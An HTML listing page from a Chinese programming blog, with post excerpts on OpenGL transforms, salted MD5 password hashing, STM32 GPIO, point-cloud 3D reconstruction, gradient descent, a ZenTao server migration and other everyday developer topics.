<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/66072fc0998c2169333b0129689a9707/" rel="bookmark">
			OpenGL学习脚印: 投影矩阵和视口变换矩阵(math-projection and viewport matrix)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		写在前面 前面几节分别介绍了模型变换，视变换，本节继续学习OpenGL坐标变换过程中的投影变换。这里主要是从数学角度推导投影矩阵。对数学不感兴趣的，可以稍微了解下，或者跳过本节内容。
本文主要翻译并整理自 songho OpenGL Projection Matrix一文，这里对他的推导思路稍微进行了整理。
通过本节可以了解到
透视投影矩阵的推导正交投影矩阵的 推导视口变换矩阵的推导zFighting问题 投影变换 OpenGL最终的渲染设备是2D的，我们需要将3D表示的场景转换为最终的2D形式，前面使用模型变换和视变换将物体坐标转换到照相机坐标系后，需要进行投影变换，将坐标从相机—》裁剪坐标系，经过透视除法后，变换到规范化设备坐标系(NDC)，最后进行视口变换后，3D坐标才变换到屏幕上的2D坐标，这个过程如下图所示：
投影变换通过指定视见体(viewing frustum)来决定场景中哪些物体将可能会呈现在屏幕上。在视见体中的物体会出现在投影平面上，而在视见体之外的物体不会出现在投影平面上。投影包括很多类型，OpenGL中主要考虑透视投影(perspective projection)和正交投影( orthographic projection)。两者之间存在很大的区别，如下图所示(图片来自Modern OpenGL)：
上面的图中，红色和黄色球在视见体内，因而呈现在投影平面上，而绿色球在视见体外，没有在投影平面上成像。
指定视见体通过(GLdouble left, GLdouble right, GLdouble bottom, GLdouble top, GLdouble nearVal, GLdouble farVal)6个参数来指定。注意在相机坐标系下，相机指向-z轴，nearVal和farVal表示的剪裁平面分别为:近裁剪平面 z=−nearVal ，以及远裁剪平面 z=−farVal 。推导投影矩阵，就要利用这6个参数。在OpenGL中成像是在近裁剪平面上完成。
透视投影矩阵的推导 透视投影中，相机坐标系中点被映射到一个标准立方体中，即规范化设备坐标系中，其中 [l,r]映射到[−1,1] ， [b,t] 映射到[-1,1]中，以及 [n,f] 被映射到 [−1,1] ，如下图所示： 注意到上面的相机坐标系为右手系，而NDC中+z轴向内，为左手系。
我们的目标 求出投影矩阵的目标就是要找到一个透视投影矩阵P使得下式成立： ⎡⎣⎢⎢⎢xcyczcwc⎤⎦⎥⎥⎥=P∗⎡⎣⎢⎢⎢xeyezewe⎤⎦⎥⎥⎥ ⎡⎣⎢xnynzn⎤⎦⎥=⎡⎣⎢xc/wcyc/wczc/wc⎤⎦⎥ 上面的除以 wclip 过程被称为透视除法。要找到我们需要的矩阵P，我们需要利用两个关系: 投影位置 xp , yp 和相机坐标系中点 xe , ye之间关系。投影后对于z分量都是 z_{p}=-nearVal$。利用 xp ， yp 和 xndc，yndc 关系求出 xclip,yclip 。利用 zn 与 ze 关系得出 zclip 计算投影平面上的位置 投影时原先位于相机坐标系中的点 p=(xe,ye,ze) 投影到投影平面后，得到点 p′=(xp,yp,−nearVal) 。具体过程如下图所示： 需要空间想象一下，可以得出左边的图是俯视图，右边是侧视图。 利用三角形的相似性，通过俯视图可以计算得到: xpxe=−nze 即: xp=xen−ze(1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/66072fc0998c2169333b0129689a9707/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/037a2aebefa625612a330f3bcc2671c3/" rel="bookmark">
			盐值加密介绍
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 简单说就是为了使相同的密码拥有不同的hash值的一种手段 就是盐化 MD5自身是不可逆的 但是目前网路上有很多数据库支持反查询 如果用户密码数据库不小心被泄露 黑客就可以通过反查询方式获得用户密码 或者对于数据库中出现频率较高的hash码(即很多人使用的)进行暴力破解(因为它通常都是弱口令) 盐值就是在密码hash过程中添加的额外的随机值 比如我的id是癫ω倒④ゞ 密码是123456 存在数据库中的时候就可以对字符串“123456/癫ω倒④ゞ ”进行hash，而验证密码的时候也以字符串“(要验证的密码)/癫ω倒④ゞ ”进行验证 这样有另外一个笨蛋密码是123456的时候 依然能构造出不同的hash值 并且能成功的验证 这时候我的id就作为盐值 为密码进行复杂hash了 所以么。。盐值的作用是减少数据库泄露带来的损失 如果你RP非常好 猜中了我的密码是123456 我也阻止不了你啊→_→
什么叫盐值加密 Spring security怎样进行盐值加密 以前的md5原理是 密码密文=md5算法（密码明文）； 这样明文与密文其实还是一一对应的 那么人家就可以用字典攻击（就是一个一个的试）来探测密码 加盐（盐值加密）的算法很多 Spring security用的是： 密码密文=md5算法（密码明文{盐值}）； 这个盐值就可以自己随便设置了，弄一个静态字符串或者用用户的登录名 举个例子： 用户名：thr 密码：fou 用用户名作为盐值 打开网页：http://www.md5.org.cn/md5/Encrypt.asp 输入：thr{fou} 得到密文：5dbae131e3eea6ce50068aab9292c8c3 OK.应该明白了 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5871585b91ab46e6e4c94a1606f87c1e/" rel="bookmark">
			STM32库中关于GPIO_PinRemapConfig函数的使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		对于初学习者来说为什么用到PB3和PB4时无法控制输出呢？
下面就这一问题进行分析讲解。
首先，STM32F10x系列的MCU复位后，PA13/14/15 &amp; PB3/4默认配置为JTAG功能。有时我们为了充分利用MCU I/O口的资源，会把这些
端口设置为普通I/O口。具体方法如下：
在GPIO_Configuration(); // 配置使用的 GPIO 口：
GPIO_PinRemapConfig(GPIO_Remap_SWJ_Disable, ENABLE); // 改变指定管脚的映射 GPIO_Remap_SWJ_Disable，SWJ 完全禁用（JTAG+SW-DP)，而且管脚映射函数，需要在GPIO配置函数GPIO_Configuration()中
GPIO_PinRemapConfig(GPIO_Remap_SWJ_JTAGDisable , ENABLE); // 改变指定管脚的映射 GPIO_Remap_SWJ_JTAGDisable ，JTAG-DP 禁用 + SW-DP 使能，而且管脚映射函数，需要在GPIO配置函数GPIO_Configuration()中 GPIO_InitStructure.GPIO_Pin = GPIO_Pin_3 | GPIO_Pin_4;
GPIO_InitStructure.GPIO_Speed = GPIO_Speed_50MHz;
GPIO_InitStructure.GPIO_Mode = GPIO_Mode_Out_PP;
GPIO_Init(GPIOB, &amp;GPIO_InitStructure);
GPIO_InitStructure.GPIO_Pin = GPIO_Pin_11 | GPIO_Pin_12 | GPIO_Pin_13;
GPIO_InitStructure.GPIO_Speed = GPIO_Speed_50MHz;
GPIO_InitStructure.GPIO_Mode = GPIO_Mode_Out_PP;
GPIO_Init(GPIOA, &amp;GPIO_InitStructure); 注意：不要忘记在RCC_Configuration()中开启AFIO时钟，
//AFIO时钟
RCC_APB2PeriphClockCmd(RCC_APB2Periph_AFIO, ENABLE);
转载于:https://www.cnblogs.com/watson8544/p/5552492.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/62031c7780d8c1c4831b33c434519642/" rel="bookmark">
			三维重建技术概述
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		基于视觉的三维重建，指的是通过摄像机获取场景物体的数据图像，并对此图像进行分析处理，再结合计算机视觉知识推导出现实环境中物体的三维信息。
1. 相关概念 （1）彩色图像与深度图像 彩色图像也叫作RGB图像，R、G、B三个分量对应于红、绿、蓝三个通道的颜色，它们的叠加组成了图像像素的不同灰度级。RGB颜色空间是构成多彩现实世界的基础。深度图像又被称为距离图像，与灰度图像中像素点存储亮度值不同，其像素点存储的是该点到相机的距离，即深度值。图2-1表示深度图像与灰度图像之间的关系。
图2-1 深度图像与灰度图像 Fig.2-1 The depth image and gray image
深度值指的目标物体与测量器材之间的距离。由于深度值的大小只与距离有关，而与环境、光线、方向等因素无关，所以深度图像能够真实准确的体现景物的几何深度信息。通过建立物体的空间模型，能够为深层次的计算机视觉应用提供更坚实的基础。
图2-2 人物的彩色图像与深度图像 Fig.2-2 Color image and depth image of the characters
（2）PCL PCL（Point Cloud Library，点云库）是由斯坦福大学的Dr.Radu等学者基于ROS(Robot Operating System，机器人操作系统)下开发与维护的开源项目，最初被用来辅助机器人传感、认知和驱动等领域的开发。2011年PCL正式向公众开放。随着对三维点云算法的加入与扩充，PCL逐步发展为免费、开源、大规模、跨平台的C++编程库。
PCL框架包括很多先进的算法和典型的数据结构，如滤波、分割、配准、识别、追踪、可视化、模型拟合、表面重建等诸多功能。能够在各种操作系统和大部分嵌入式系统上运行，具有较强的软件可移植性。鉴于PCL的应用范围非常广，专家学者们对点云库的更新维护也非常及时。PCL的发展时至今日，已经来到了1.7.0版本。相较于早期的版本，加入了更多新鲜、实用、有趣的功能，为点云数据的利用提供了模块化、标准化的解决方案。再通过诸如图形处理器、共享存储并行编程、统一计算设备架构等领先的高性能技术，提升PCL相关进程的速率，实现实时性的应用开发。
在算法方面，PCL是一套包括数据滤波、点云配准、表面生成、图像分割和定位搜索等一系列处理点云数据的算法。基于不同类型区分每一套算法，以此把整合所有三维重建流水线功能，保证每套算法的紧凑性、可重用性与可执行性。例如PCL中实现管道运算的接口流程：
①创建处理对象，例如滤波、特征估计、图像分割等； ②通过setInputCloud输入初始点云数据，进入处理模块； ③设置算法相关参数； ④调用不同功能的函数实现运算，并输出结果。
为了实现模块化的应用与开发，PCL被细分成多组独立的代码集合。因此便可方便快捷的应用于嵌入式系统中，实现可移植的单独编译。如下列举了部分常用的算法模块：
libpcl I/O：完成数据的输入、输出过程，如点云数据的读写； libpcl filters：完成数据采样、特征提取、参数拟合等过程； libpcl register：完成深度图像的配准过程，例如迭代最近点算法； libpcl surface：完成三维模型的表面生成过程，包括三角网格化、表面平滑等。
此类常用的算法模块均具有回归测试功能，以确保使用过程中没有引进错误。测试一般由专门的机构负责编写用例库。检测到回归错误时，会立即将消息反馈给相应的作者。因此能提升PCL和整个系统的安全稳定性。
（3）点云数据 如图2-3所示，展示了典型的点云数据（Point Cloud Data，PCD）模型。
图2-3 点云数据及其放大效果
点云数据通常出现在逆向工程中，是由测距设备获取的物体表面的信息集合。其扫描资料以点的形式进行记录，这些点既可以是三维坐标，也可以是颜色或者光照强度等信息。通常所使用的点云数据一般包括点坐标精度、空间分辨率和表面法向量等内容。点云一般以PCD格式进行保存，这种格式的点云数据可操作性较强，同时能够提高点云配准融合的速度。本文研究的点云数据为非结构化的散乱点云，属于三维重建特有的点云特点。
（4）坐标系 在三维空间中，所有的点必须以坐标的形式来表示，并且可以在不同的坐标系之间进行转换。首先介绍基本坐标系的概念、计算及相互关系。
①图像坐标系
图像坐标系分为像素和物理两个坐标系种类。数字图像的信息以矩阵形式存储，即一副像素的图像数据存储在维矩阵中。图像像素坐标系以为原点、以像素为基本单位，U、V分别为水平、垂直方向轴。图像物理坐标系以摄像机光轴与图像平面的交点作为原点、以米或毫米为基本单位，其X、Y轴分别与U、V轴平行。图2-4展示的是两种坐标系之间的位置关系：
图2-4 图像像素坐标系与物理坐标系 Fig.2-4 Image pixel coordinate system and physical coordinate system
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/62031c7780d8c1c4831b33c434519642/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ac1d01fd7925e25d13127f60a1a3cd10/" rel="bookmark">
			VMware P2V报错
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		VMware P2V win2008R2操作系统，第一步报错：fault.agentinstallfault.summary，无法在源主机临时安装agent代理，处理步骤：
1、检查Windows防火墙和杀毒软件等，确定是否端口被限制。
2、检查计算机管理~服务里面的‘server’服务是否启动
3、如果1，2步仍然报错，手动将vmware-converter-agent.exe安装程序传到源主机进行安装。(at C:\Program Files (x86)\VMware\VMware vCenter Converter Standalone)
4、如果3步报错，提示报错：error 29142 could not start service vstor2 mntapi2.0driver(shared)。将源主机重启即可。(原因是源主机以前做过P2V或安装过相关VMware软件)
重启源主机后使用converter standaloneP2V抓取源主机正常。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/65a586a6cfc220705a33e4a3c5909b58/" rel="bookmark">
			gitlab中国官方网站
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		https://www.gitlab.cc/downloads/#centos7 http://www.tuicool.com/articles/bEz6Vf http://blog.chinaunix.net/uid-20771867-id-4814515.html
转载于:https://blog.51cto.com/kure6/1785242
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0dcfea139fa4ec2f34ea20cd4b771376/" rel="bookmark">
			梯度下降法及其Python实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		梯度下降法（gradient descent），又名最速下降法（steepest descent）是求解无约束最优化问题最常用的方法，它是一种迭代方法，每一步主要的操作是求解目标函数的梯度向量，将当前位置的负梯度方向作为搜索方向（因为在该方向上目标函数下降最快，这也是最速下降法名称的由来）。
梯度下降法特点：越接近目标值，步长越小，下降速度越慢。
直观上来看如下图所示：
这里每一个圈代表一个函数梯度，最中心表示函数极值点，每次迭代根据当前位置求得的梯度（用于确定搜索方向以及与步长共同决定前进速度）和步长找到一个新的位置，这样不断迭代最终到达目标函数局部最优点（如果目标函数是凸函数，则到达全局最优点）。
下面我们将通过公式来具体说明梯度下降法
下面这个h(θ)是我们的拟合函数
也可以用向量的形式进行表示：
下面函数是我们需要进行最优化的风险函数，其中的每一项都表示在已有的训练集上我们的拟合函数与y之间的残差，计算其平方损失函数作为我们构建的风险函数（参见最小二乘法及其Python实现）
这里我们乘上1/2是为了方便后面求偏导数时结果更加简洁，之所以能乘上1/2是因为乘上这个系数后对求解风险函数最优值没有影响。
我们的目标就是要最小化风险函数，使得我们的拟合函数能够最大程度的对目标函数y进行拟合，即：
后面的具体梯度求解都是围绕这个目标来进行。
批量梯度下降BGD
按照传统的思想，我们需要对上述风险函数中的每个求其偏导数，得到每个对应的梯度
这里表示第i个样本点的第j分量，即h(θ)中的
接下来由于我们要最小化风险函数，故按照每个参数的负梯度方向来更新每一个
这里的α表示每一步的步长
从上面公式可以注意到，它得到的是一个全局最优解，但是每迭代一步，都要用到训练集所有的数据，如果m很大，那么可想而知这种方法的迭代速度！！所以，这就引入了另外一种方法，随机梯度下降。
随机梯度下降SGD
因为批量梯度下降在训练集很大的情况下迭代速度非常之慢，所以在这种情况下再使用批量梯度下降来求解风险函数的最优化问题是不具有可行性的，在此情况下，提出了——随机梯度下降
我们将上述的风险函数改写成以下形式：
其中，
称为样本点的损失函数
接下来我们对每个样本的损失函数，对每个求其偏导数，得到每个对应的梯度
然后根据每个参数的负梯度方向来更新每一个
与批量梯度下降相比，随机梯度下降每次迭代只用到了一个样本，在样本量很大的情况下，常见的情况是只用到了其中一部分样本数据即可将θ迭代到最优解。因此随机梯度下降比批量梯度下降在计算量上会大大减少。
SGD有一个缺点是，其噪音较BGD要多，使得SGD并不是每次迭代都向着整体最优化方向。而且SGD因为每次都是使用一个样本进行迭代，因此最终求得的最优解往往不是全局最优解，而只是局部最优解。但是大的整体的方向是向全局最优解的，最终的结果往往是在全局最优解附近。
下面是两种方法的图形展示：
从上述图形可以看出，SGD因为每次都是用一个样本点进行梯度搜索，因此其最优化路径看上去比较盲目（这也是随机梯度下降名字的由来）。
对比其优劣点如下：
批量梯度下降：
优点：全局最优解；易于并行实现；总体迭代次数不多
缺点：当样本数目很多时，训练过程会很慢，每次迭代需要耗费大量的时间。
随机梯度下降：
优点：训练速度快，每次迭代计算量不大
缺点：准确度下降，并不是全局最优；不易于并行实现；总体迭代次数比较多。
============ 分割分割 =============
上面我们讲解了什么是梯度下降法，以及如何求解梯度下降，下面我们将通过Python来实现梯度下降法。
# _*_ coding: utf-8 _*_ # 作者: yhao # 博客: http://blog.csdn.net/yhao2014 # 邮箱: yanhao07@sina.com # 训练集 # 每个样本点有3个分量 (x0,x1,x2) x = [(1, 0., 3), (1, 1., 3), (1, 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0dcfea139fa4ec2f34ea20cd4b771376/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/86a212cf3da2de20df88caa84580c6bf/" rel="bookmark">
			android Vitamio(维他命)入门
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Vitamio 官网：https://www.vitamio.org/
sdk下载地址：https://www.vitamio.org/Download/
下载后解压里面是这样的
然后eclipse导入那个5.0.1的工程，导入时有两个工程一个依赖工程一个demo
然后再清单文件加入权限
&lt;uses-permission android:name="android.permission.WAKE_LOCK" /&gt;
&lt;uses-permission android:name="android.permission.INTERNET" /&gt;
&lt;uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" /&gt;
&lt;uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" /&gt;
然后就贴代码了：
public class MainActivity extends Activity {
private VideoView videoView;
private String [] video ={
"http://dlqncdn.miaopai.com/stream/MVaux41A4lkuWloBbGUGaQ__.mp4",
"http://movie.ks.js.cn/flv/other/2014/06/20-2.flv",
"http://movie.ks.js.cn/flv/other/1_0.mp4"
};
@Override
protected void onCreate(Bundle savedInstanceState) {
super.onCreate(savedInstanceState);
setContentView(R.layout.activity_main);
Vitamio.isInitialized(this);
initView();
}
private void initView() {
videoView=(VideoView) findViewById(R.id.videoView);
videoPlay();
}
private void videoPlay() {
String path = "";
path=video[new Random().nextInt(video.length)];
//播放文件路径
videoView.setVideoPath(path);
videoView.setMediaController(new MediaController(this));
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/86a212cf3da2de20df88caa84580c6bf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/94f7fe761a9424ddf46a2df8c786610a/" rel="bookmark">
			对反正弦函数的泰勒公式的转换加速
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 反正弦函数的泰勒公式为：arcsin(x)=x+ 1/2* x^3/3+ 1/2*3/4* x^5/5+ 1/2*3/4*5/6* x^7/7+............. ∑(n=1～∞) [(2n)!]x^(2n+1)/[4^n*(n!)^2*(2n+1)] 设Ga 为 3 5 7 ....的最小公倍数 化为:arcsin(x)= x+x*1/2*x^2(1/3+3/4*x^2(1/5+5/6*x^2(1/7......))) =x+(x*x^2*1/2(Ga/3+x^2*3/4(Ga/5+x^2*5/6(Ga/7......))) )/Ga 最小公倍数的位长小于计算精度时,除法运算开始加速,需要除法有除尽判断功能.
另外换算成这种形式利于编程实现。
这个公式类似的测试在我的贴子:基于泰勒展开式的高精三角函数实现 - 第3页 - 算法交流 - 数学研发论坛 - Powered by Discuz! http://bbs.emath.ac.cn/thread-8882-3-1.html 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c6f956ce7729035bfd22542f615d4545/" rel="bookmark">
			Linux is not Matrix——禅道的备份
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 每天都会很多莫名其妙的事情，然后会发生很多莫名奇妙的错误，最后这些错误莫名奇妙的就归我了，以后还是少接这种不特别急得任务，给大伙多练练手吧。
这次是禅道的崩崩崩了，不知道为啥，我们的禅道放在了阿里云的服务器上面，然而这台阿里云的收费政策是流量，因为欠费了，就出现了访问不了的情况。
所以这次我就直接将禅道搭建到了局域网服务器上面，省的访问不到- -。
这里有些困难的地方就是原来的东西是在windows服务器上面，现在的服务器是linux，所以那种直接将文件拷过来的做法就不行了。
我这里直接就下了一个linxu的禅道，然后在/opt目录解压。
cd /opt wget http://dl.cnezsoft.com/zentao/8.2.1/ZenTaoPMS.8.2.1.zip tar zxvf ./ZenTaoPMS.8.2.1.zip 解压之后就比较好办了，进入目录，直接启动禅道。 cd ./zbox ./zbox start 启动之后我们进入禅道，发现果然什么数据都没有- -。 这个时候不要方，官网给了一种方案，就是将禅道的mysql数据库备份下来，然后到新的数据库中还原。执行禅道的备份脚本。
I:\xampp\zentao\bin&gt;i:\xampp\php\php.exe I:\xampp\zentao\bin\php\backup.php 备份之后，会在backup文件夹冲出现两个压缩包文件。一个是数据库，一个是上传的所有文件。 我们将文件的压缩包放到linux的/opt/zbox/app/zentao/www/data/upload/1文件夹中，保持原来的文件目录。
将数据库的脚本传到linux的根目录下，然后连接mysql，zentao自带的mysql在run文件夹中，执行下面的命令就行。
/opt/zbox/run/mysql/mysql 在mysql命令行中，导入压缩包重的.sql文件。 use zentao; source db.20160529.sql; ok,直接在浏览器访问IP地址就能打开禅道了，打开用原来的账号登录吧。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/266c5c230e80bfc6002ae78c6c2368e4/" rel="bookmark">
			OpenGL学习脚印: 模型变换(model transformation)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		写在前面 前面为本节内容准备了向量和矩阵、线性变换等内容，本节开始学习OpenGL中的坐标处理。OpenGL中的坐标处理过程包括模型变换、视变换、投影变换、视口变换等内容，这个主题的内容有些多，因此分节学习，主题将分为5节内容来学习。本节主要学习模型变换。本节示例代码均可在我的github处下载。
通过本节可以了解到
模型变换的作用模型变换的类型和计算方法 坐标处理的全局过程(了解，另文详述) OpenGL中的坐标处理包括模型变换、视变换、投影变换、视口变换等内容，具体过程如下图1所示:
每一个过程处理都有其原因，这些内容计划将会在不同节里分别介绍，最后再整体把握一遍。 今天我们学习第一个阶段——模型变换。
为什么需要模型变换 我们在OpenGL中通过定义一组顶点来定义一个模型，或者通过其他3D建模软件事先建好模型然后导入到OpenGL中。顶点属性定义了模型。如果我们要在一个场景中不同位置显示同一个模型怎么办？ 如果我们要以不同的比例、不同角度显示同一个模型又怎么办 ？ 如果继续以类似的顶点属性数据定义同一个模型，调整它满足上述需求的话，不仅浪费显卡内存，而且这个调整的工作量也很大，因此效率很低。更好地解决方法是，我们定义的模型根据需要可以执行放大、缩小等操作来不同比例显示，可以通过平移来放在不同位置，可以通过旋转来按不同角度显示。这种方式就是执行模型变换。 模型变换通过对模型执行平移(translation)、缩放(scale)、旋转(rotation)、镜像(reflection)、错切(shear)等操作，来调整模型的过程。通过模型变换，我们可以按照合理方式指定场景中物体的位置等信息。
平移变换 平移就是将物体从一个位置 p=(x,y,z) ，移动到另一个位置 p′=(x′,y′,z′) 的过程，记为 p′=p+d ，其中 d=(x′−x,y′−y,z′−z)=(tx,ty,tz) 。使用齐次坐标系表示为:
p′=Tp=⎡⎣⎢⎢⎢⎢100001000010txtytz1⎤⎦⎥⎥⎥⎥⎡⎣⎢⎢⎢xyz1⎤⎦⎥⎥⎥=⎡⎣⎢⎢⎢⎢x+txy+tyz+tz1⎤⎦⎥⎥⎥⎥ 如果对向量和矩阵不熟悉，可以回过去看前面介绍的向量和矩阵；如果对上面使用的齐次坐标系不熟悉，可以回过去看前面介绍的线性变换部分。
本节的模型变换在OpenGL程序中，可以使用GLM数学库实现。例如平移变换实现如下：
glm::mat4 model; // 构造单位矩阵 model = glm::translate(model, glm::vec3(-0.5f, 0.0f, 0.0f)); 上述表示平移向量为(-0.5,0.0,0.0)，得到一个平移矩阵存储到model中。
在程序中我们绘制了4个矩形，通过平移将其放在不同位置，效果如下图所示： 在上图示例中，我们使用不同的着色器还绘制了坐标轴，坐标轴通过箭头和轴线绘制。在xoy坐标系中，第一个象限为原图，第二个象限为平移(-0.5,0.0,0.0)后的矩形,第三象限为平移(-0.8,-0.8,0.0)后的矩形，第四个象限为平移(0.0,-0.5,0.0)后的矩形。
注意 通过上面坐标处理的全局过程图1可以看到，实际顶点输出还需要经过视变换、投影变换过程等处理，本节主要讨论模型变换，因此我们在代码中，不考虑视变换和投影变换，使用默认的视变换和投影变换，即这两个变换保持为单位矩阵。默认的方式就是我们一直在使用的正交投影方式。变换矩阵在着色器中使用uniform变量传递，在c++程序中使用glm::mat4与之对应。对uniform变量不熟悉的话，可以回过头去看2D纹理部分的使用方法。
设置默认视变换和投影变换矩阵的代码如下：
glm::mat4 projection;// 投影变换矩阵 glm::mat4 view; // 视变换矩阵 glm::mat4 model; // 模型变换矩阵 glUniformMatrix4fv( glGetUniformLocation(shader.programId,"projection"), 1, GL_FALSE, glm::value_ptr(projection)); glUniformMatrix4fv( glGetUniformLocation(shader.programId,"view"), 1,GL_FALSE, glm::value_ptr(view)); 绘制四个矩形的代码为：
// 绘制第一个矩形 glUniformMatrix4fv( glGetUniformLocation(shader.programId, "model"), 1, GL_FALSE, glm::value_ptr(model)); glDrawElements(GL_TRIANGLES, 6, GL_UNSIGNED_SHORT, 0); // 绘制第二个矩形 model = glm::mat4(); model = glm::translate(model, glm::vec3(-0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/266c5c230e80bfc6002ae78c6c2368e4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ff716165855a70486107cf4bd6773018/" rel="bookmark">
			c语言：用结构体变量输出学生的信息，包括学号，姓名，性别。
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		用结构体变量输出学生的信息，包括学号，姓名，性别。
解：程序：
#include&lt;stdio.h&gt;
int main()
{
struct Student
{
long int num;
char name[20];
char sex[5];
char addr[20];
}a = {1010,"yaoyao","Man","xi'an"};//定义结构体变量a并初始化
printf("num:%ld\nname:%s\nsex:%s\naddress:%s\n", a.num, a.name, a.sex, a.addr);
return 0;
}
结果：
num:1010
name:yaoyao
sex:Man
address:xi'an
请按任意键继续. . .
本文出自 “岩枭” 博客，请务必保留此出处http://yaoyaolx.blog.51cto.com/10732111/1751915
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8ab039b543164a50b85167cfbf3488fd/" rel="bookmark">
			ava包装类型的MAX_VALUE到底是多少啊
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 System.out.println(Integer.MAX_VALUE); System.out.println(Long.MAX_VALUE); System.out.println(Double.MAX_VALUE); System.out.println(Float.MAX_VALUE); System.out.println(Short.MAX_VALUE); System.out.println(Byte.MAX_VALUE); 结果是 2147483647 9223372036854775807 1.7976931348623157E308 3.4028235E38 32767 127 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/202dc0799e40c5ea69c809af2fc199f9/" rel="bookmark">
			远程桌面无法拷贝大文件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		方法一：
1、当我们通过远程桌面，从一台机器往另一台机器拷贝大文件时候，会出现中断情况
2、我们可以先在远程机器上新建一个文件夹test，右键设置文件夹 属性
在属性窗口中 点击共享页签 -----------点击共享----------选择要与谁共享的用户中选择 Everyone,并设置权限级别，
--------- 然后点击添加---如下图
选择项目，然后右键复制链接，
3.然后 按 win + R 键，粘贴链接，最后按 Enter 键，即可打开共享的文件夹，这时候可以进行文件的拷贝
注：机器名 也可以换成对应的IP
方法二：
1.在远程桌面连接弹框中选择 “本地资源 ” 页签
2.然后点击“详细信息” 将会弹出下图右侧的本地设备和资源
3.勾选驱动器，然后点击“确定”
经过上述设置后，然后远程连接到机器就可以进行大文件的复制了
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/649c7e70697daea2f11a8434ea7130f7/" rel="bookmark">
			Blender入门
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		看了几个入门视频.
做了一个长椅,学了很多快捷键 http://list.youku.com/albumlist/show?id=26335838&amp;ascending=1&amp;page=1
做了一个茶杯, 把整个建模和加颜色,渲染的流程走了一遍 https://www.youtube.com/watch?v=y__uzGKmxt8
youtube上这个教做茶杯的人还有更多的blender教程感觉很不错 https://www.youtube.com/channel/UCJspWFXSL1guQPdFqh4lFjQ
几个快捷键:
小键盘的几个键是可以各种视图的.
鼠标右键选中物体. Shift+A可以添加物体. A是全选, B是框选，Ｃ是点选，ctrl＋Ｂ渲染预览区域，ctrl+alt+B是取消
G可以平移, G+x沿x轴平移. S缩放, R旋转, 然后按右键取消,按左键确定.
用pencil画线之类的时候,按空格,回车,esc都可以退出.
ctrl+z是撤销
